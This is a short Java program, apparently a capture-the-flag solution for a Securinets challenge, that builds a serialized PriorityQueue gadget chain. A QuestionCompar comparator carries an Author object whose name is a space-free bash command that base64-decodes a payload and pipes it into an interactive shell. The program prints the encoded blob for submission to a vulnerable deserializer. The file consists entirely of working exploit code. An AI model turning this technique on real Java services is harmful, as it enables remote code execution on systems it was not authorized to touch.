import com.securinets.services.Author;
import com.securinets.utils.QuestionCompar;

import java.io.*;
import java.util.Base64;
import java.util.PriorityQueue;

public class Test implements Serializable {

    public static void main(String[] args)throws Exception {
        String zero = "f5a5a608";
        Author author = new Author();
        author.setUuid(zero);
        author.setName("bash -c {echo,exploit}|{base64,-d}|{bash,-i}");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(author);

        QuestionCompar questionCompar = new QuestionCompar();
        questionCompar.setInternal(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
        PriorityQueue queue = new PriorityQueue(2,questionCompar);
        queue.add(1);
        queue.add(2);

        ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream2 = new ObjectOutputStream(byteArrayOutputStream2);
        objectOutputStream2.writeObject(queue);

        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream2.toByteArray())));

    }
}
